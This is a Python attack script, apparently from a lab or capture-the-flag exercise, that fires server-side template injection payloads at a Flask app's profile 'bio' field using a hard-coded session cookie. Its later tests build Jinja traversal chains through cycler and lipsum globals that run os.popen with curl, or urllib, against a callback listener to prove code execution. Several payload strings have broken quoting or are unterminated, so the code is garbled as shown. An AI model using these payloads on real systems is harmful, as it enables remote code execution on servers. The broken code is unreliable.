#!/usr/bin/env python3
import requests
import urllib.parse
import time

base_url = "http://127.0.0.1:32813"
callback_url = "http://localhost:8888/callback"

# Use provided session cookie
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVqK6Q.DjdnJP5cp110FpB2UDxmK976cZA"
cookies = {"session": session_cookie}

print("=== Ultra Advanced SSTI Filter Fingerprinting ===")
print(f"Target: {base_url}")
print(f"Callback: {callback_url}")

def test_payload(payload_name, raw_payload, description=""):
    print(f"\n{'='*70}")
    print(f"Test: {payload_name}")
    if description:
        print(f"Description: {description}")
    
    profile_url = base_url + "/profile"
    data = {"bio": raw_payload}
    
    try:
        response = requests.post(profile_url, data=data, cookies=cookies, allow_redirects=False)
        print(f"Status Code: {response.status_code}")
        print(f"Response Length: {len(response.text)}B")
        
        if response.status_code == 200:
            print("✓ SUCCESS: Filter bypassed!")
        elif response.status_code == 400:
            print("✗ BLOCKED: 400 Bad Request")
        elif response.status_code == 500:
            print("! SERVER ERROR: 500 (may indicate execution)")
        else:
            print(f"? Other status: {response.status_code}")
        
        if response.text and len(response.text) < 300:
            print(f"Response: {response.text}")
            
        return response.status_code
    except Exception as e:
        print(f"Request error: {e}")
        return None

print(f"\n{'='*70}")
print("TEST 1: FINGERPRINTING FILTER STRENGTH")
print(f"{'='*70}")

# Basic control - test if normal input works at all
payload1 = "Normal bio text without special characters"
control_result = test_payload("Normal text control", payload1, "Testing if normal POST works")

# Test 1a: Just {{ }}
payload1a = "{{ test }}"
result1a = test_payload("Double curly braces", payload1a, "Testing base template syntax")

# Test 1b: Just __class__
payload1b = "Some text __class__ more text"
result1b = test_payload("__class__ keyword", payload1b, "Testing if __class__ alone is blocked")

# Test 1c: Just urllib
payload1c = "This contains urllib in text"
result1c = test_payload("urllib keyword", payload1c, "Testing if urllib keyword is blocked")

# Test 1d: Just os.popen
payload1d = "Documentation about os.popen function"
result1d = test_payload("os.popen keywords", payload1d, "Testing if os.popen is blocked")

print(f"\n{'='*70}")
print("TEST 2: SUBTLE VARIATIONS TO BYPASS {{ DETECTION")
print(f"{'='*70}")

# Technique 1: Added space inside braces
payload2a = "{{ test }}"
result2a = test_payload("Space inside braces", payload2a, "Adding space inside curly braces")

# Technique 2: No spaces
payload2b = "{{test}}"
result2b = test_payload("No spaces in braces", payload2b, "No spaces in template tag")

# Technique 3: Different quote styles
payload2c = "{{ 'test' }}"
result2c = test_payload("Single quotes", payload2c, "Using single quotes")

payload2d = "{{ \"test\" }}"
result2d = test_payload("Double quotes", payload2d, "Using double quotes")

# Technique 4: Newlines in expression
payload2e = "{{ \ntest\n }}"
result2e = test_payload("Newlines in expression", payload2e, "Newlines inside expression")

# Technique 5: Comment inside expression
payload2f = "{{ test {# comment #} }}"
result2f = test_payload("Comment inside expression", payload2f, "Jinja comment inside expression")

# Technique 6: HTML comment inside expression
payload2g = "{{ test <!-- HTML comment --> }}"
result2g = test_payload("HTML comment in expression", payload2g, "HTML comment inside expression")

# Technique 7: Multiple statements
payload2h = "{% set x = 1 %} {{ x }}"
result2h = test_payload("Multiple Jinja statements", payload2h, "Using {% set %} before {{ }}")

# Technique 8: Raw tags
payload2i = "{% raw %} {{ test }} {% endraw %}"
result2i = test_payload("Raw template tag", payload2i, "Escaping with {% raw %}")

print(f"\n{'='*70}")
print("TEST 3: BYPASS ON DOUBLE CURLY BRACE DETECTION")
print(f"{'='*70}")

# Technique 1: Use url_for() or other Flask globals with less suspicious syntax
payload3a = "{{ config.items() }}"
result3a = test_payload("config.items()", payload3a, "Safe-looking config.items()")

# Technique 2: Use request.args directly
payload3b = "{{ request.args.test }}"
result3b = test_payload("request.args access", payload3b, "Accessing request.args")

# Technique 3: Use range/lipsum - built-in Jinja objects
payload3c = "{{ range(10) }}"
result3c = test_payload("range(10)", payload3c, "Safe range function")

payload3d = "{{ lipsum() }}"
result3d = test_payload("lipsum()", payload3d, "lipsum built-in")

# Technique 4: Use cycler (another built-in)
payload3e = "{{ cycler }}"
result3e = test_payload("cycler", payload3e, "cycler built-in")

print(f"\n{'='*70}")
print("TEST 4: BREAKING UP KEYWORDS WITH JINJA FILTERS")
print(f"{'='*70}")

# Technique 1: Using |attr() with string concatenation
payload4a = "{{ ({}|attr((session)|list|reverse|join))|attr("__class__") }}"
result4a = test_payload("attr with string concat", payload4a, "Building attribute names dynamically")

# Technique 2: Using request.args to inject keywords
payload4b = "{{ " "|attr(request.args.c) }}"
result4b = test_payload("request.args injection", payload4b, "Using request.args to inject __class__")

# Technique 3: Using list concatenation
payload4c = "{{ " "[request.args.a, request.args.b]|join }}"
result4c = test_payload("list join concat", payload4c, "Joining list to form attribute name")

# Technique 4: Using format() or other string methods
payload4d = "{{ "%sclass%s"|format("__", "__") }}"
result4d = test_payload("String formatting", payload4d, "Using format to build __class__")

print(f"\n{'='*70}")
print("TEST 5: COMPLEX TRAVERSAL WITHOUT SUSPICIOUS KEYWORDS")
print(f"{'='*70}")

# Build payload by accessing safe built-ins first, then traverse
traversal_payload = '''{{ cycler
    .__init__.__globals__.os.popen("curl http://localhost:8888/callback")
    .read() }}'''
result5a = test_payload("Multi-line cycler traversal", traversal_payload, "Multi-line payload using line breaks")

# Similar but with lipsum
traversal_payload2 = '''{{ lipsum
    .__globals__.urllib
    .request
    .urlopen("http://localhost:8888/callback")
    .read() }}'''
result5b = test_payload("Multi-line lipsum traversal", traversal_payload2, "Multi-line payload with lipsum")

print(f"\n{'='*70}")
print("TEST 6: TRYING DIFFERENT JINJA DELIMITERS")
print(f"{'='*70}")

# Some frameworks allow other delimiters
payload6a = "{{ test }}
payload6b = "%} test %{

result6a = test_payload("Reverse delimiters", payload6a, "Trying {{ with reversed braces")
result6b = test_payload("Percentage delimiters", payload6b, "Testing percentage-based delimiters")

print(f"\n{'='*70}")
